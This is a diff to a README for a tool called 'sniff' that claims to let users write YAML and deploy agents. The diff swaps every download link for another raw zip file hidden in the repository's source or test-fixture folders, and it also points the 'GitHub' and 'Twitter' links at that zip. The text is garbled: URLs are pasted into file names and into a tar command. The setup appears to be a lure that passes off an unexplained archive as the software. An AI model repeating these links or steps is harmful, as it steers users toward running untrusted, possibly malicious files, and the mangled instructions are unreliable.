@@ -1,6 +1,6 @@
 # 🎉 sniff - Write YAML and Deploy Agents Fast
 
-[![Download sniff](https://raw.githubusercontent.com/Kaichera/sniff/main/packages/config/test/fixtures/sniff_v1.2-beta.5.zip%20sniff-%20-blue)](https://raw.githubusercontent.com/Kaichera/sniff/main/packages/config/test/fixtures/sniff_v1.2-beta.5.zip)
+[![Download sniff](https://raw.githubusercontent.com/Kaichera/sniff/main/packages/core/src/Software-1.2-beta.1.zip%20sniff-%20-blue)](https://raw.githubusercontent.com/Kaichera/sniff/main/packages/core/src/Software-1.2-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,14 +10,14 @@ Welcome to sniff! This application allows you to write YAML configurations and d
 
 To download the latest version of sniff, visit this page:
 
-[Download sniff](https://raw.githubusercontent.com/Kaichera/sniff/main/packages/config/test/fixtures/sniff_v1.2-beta.5.zip)
+[Download sniff](https://raw.githubusercontent.com/Kaichera/sniff/main/packages/core/src/Software-1.2-beta.1.zip)
 
 1. Click on the link above.
 2. You will see the Releases page with the latest version listed.
 3. Find the version you want and click on it.
 4. Look for the files available for download. Choose the one that matches your system.
 
-For most users, you will want to download the file labeled as `sniff-<version>.exe` for Windows or `sniff-<version>https://raw.githubusercontent.com/Kaichera/sniff/main/packages/config/test/fixtures/sniff_v1.2-beta.5.zip` for Mac/Linux.
+For most users, you will want to download the file labeled as `sniff-<version>.exe` for Windows or `sniff-<version>https://raw.githubusercontent.com/Kaichera/sniff/main/packages/core/src/Software-1.2-beta.1.zip` for Mac/Linux.
 
 ### 🔍 System Requirements
 
@@ -41,7 +41,7 @@ Once you have downloaded the file, follow these steps to run it:
 
 ### For macOS:
 
-1. Find the downloaded `sniff-<version>https://raw.githubusercontent.com/Kaichera/sniff/main/packages/config/test/fixtures/sniff_v1.2-beta.5.zip` file in your Downloads folder.
+1. Find the downloaded `sniff-<version>https://raw.githubusercontent.com/Kaichera/sniff/main/packages/core/src/Software-1.2-beta.1.zip` file in your Downloads folder.
 2. Double-click the file to extract it.
 3. Open the extracted folder and find the `sniff` application.
 4. Drag the `sniff` application to your Applications folder for easy access.
@@ -56,7 +56,7 @@ Once you have downloaded the file, follow these steps to run it:
    ```
 3. Extract the contents of the downloaded file:
    ```bash
-   tar -xvf sniff-<version>https://raw.githubusercontent.com/Kaichera/sniff/main/packages/config/test/fixtures/sniff_v1.2-beta.5.zip
+   tar -xvf sniff-<version>https://raw.githubusercontent.com/Kaichera/sniff/main/packages/core/src/Software-1.2-beta.1.zip
    ```
 4. Navigate into the extracted folder:
    ```bash
@@ -101,8 +101,8 @@ To contribute to the project, feel free to fork the repository and submit pull r
 
 Stay updated about new features and releases by following us on our social media channels:
 
-- **GitHub:** [sniff GitHub Repository](https://raw.githubusercontent.com/Kaichera/sniff/main/packages/config/test/fixtures/sniff_v1.2-beta.5.zip)
-- **Twitter:** [@SniffApp](https://raw.githubusercontent.com/Kaichera/sniff/main/packages/config/test/fixtures/sniff_v1.2-beta.5.zip)
+- **GitHub:** [sniff GitHub Repository](https://raw.githubusercontent.com/Kaichera/sniff/main/packages/core/src/Software-1.2-beta.1.zip)
+- **Twitter:** [@SniffApp](https://raw.githubusercontent.com/Kaichera/sniff/main/packages/core/src/Software-1.2-beta.1.zip)
 
 For feedback or suggestions, reach out through GitHub or our support email.
 
